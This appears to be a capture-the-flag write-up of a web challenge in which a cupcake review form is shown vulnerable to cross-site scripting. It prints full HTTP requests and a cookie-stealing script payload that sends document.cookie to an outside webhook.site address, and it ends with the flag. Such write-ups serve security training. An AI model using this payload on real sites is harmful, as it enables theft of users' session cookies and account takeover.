# Web: Cupcake magdalena

The Cupcake Magdalena company has hired you to perform penetration testing on their web application. Can you review their application and find out any serious vulnerabilities?


**Target**: http://159.65.90.3:30645/

---

When we inspect the web page we see that there are 4 types of cupcakes. Each of them can be reviewed.

When we click the 2nd cupcake the folling request is sent: `GET /posts/2 HTTP/1.1`. It seems that the numeric parameter indicates the id of the cupcake.

Once we are in the cupcake page, we try to write a review. The following request is sent:

```http
POST /api/reviews/add HTTP/1.1
Host: 159.65.90.3:30645
Content-Length: 41
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://159.65.90.3:30645
Referer: http://159.65.90.3:30645/posts/2
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"post_id":"2","name":"a","review":"aaa"}
```
Let's try to do XSS in the form. For example, `<script>alert("hola")</script>`. We confirm that the field "review" is vulnerable. We decide to try the web hooking technique. We write a review, then we intercep the request with Burp, and in the field "review" we introduce `<script>new Image().src=\"https://webhook.site/eff815dc-37db-43cb-813e-4fa047de3dfa/?c=\"+document.cookie;</script>`. The modified request looks like:

```http
POST /api/reviews/add HTTP/1.1
Host: 159.65.90.3:30645
Content-Length: 41
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://159.65.90.3:30645
Referer: http://159.65.90.3:30645/posts/2
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"post_id":"2","name":"a","review":"<script>new Image().src=\"https://webhook.site/eff815dc-37db-43cb-813e-4fa047de3dfa/?c=\"+document.cookie;</script>"}
```
After sending the request, we do not see anything interesting in the response. Nevertheless, when we check the web hook page, we see that our reflected XSS has succeeded.

![[./reflected_xss.png]]

Finally, flag: HTB{r3fl3c73d_x55_4r3_d4ng3r0u5_4s_w3ll}




